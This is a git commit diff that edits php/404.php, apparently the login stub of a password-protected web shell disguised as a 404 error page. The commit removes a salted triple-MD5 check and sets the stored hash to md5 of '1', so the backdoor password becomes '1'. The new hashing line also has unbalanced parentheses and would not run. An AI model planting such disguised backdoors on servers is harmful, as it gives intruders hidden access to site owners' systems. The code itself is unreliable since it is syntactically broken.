9e24bd913bd1107e444ad4d21e85aceadb57e957
ranjeetkohiliyal <58361312+ranjeetkohiliyal@users.noreply.github.com>
2019-12-13 00:18:42 +0530

    Update 404.php

--- php/404.php
+++ php/404.php
@@ -2,12 +2,11 @@
 @session_start();
 @set_time_limit(0); 
 @error_reporting(0);
-$salt = "silic1234";
 $psw = trim($_POST['pass']);
-$pass = $salt.$psw;
-$pass = md5(md5(md5($pass)));
+$pass = $psw;
+$pass = md5($pass)));
 $chk_login = 1;
-$password = "8f841a9b44b0167db6056389e0106af4";
+$password = "c4ca4238a0b923820dcc509a6f75849b";
 if($pass == $password)
 {
 $_SESSION['ses'] = "$pass";
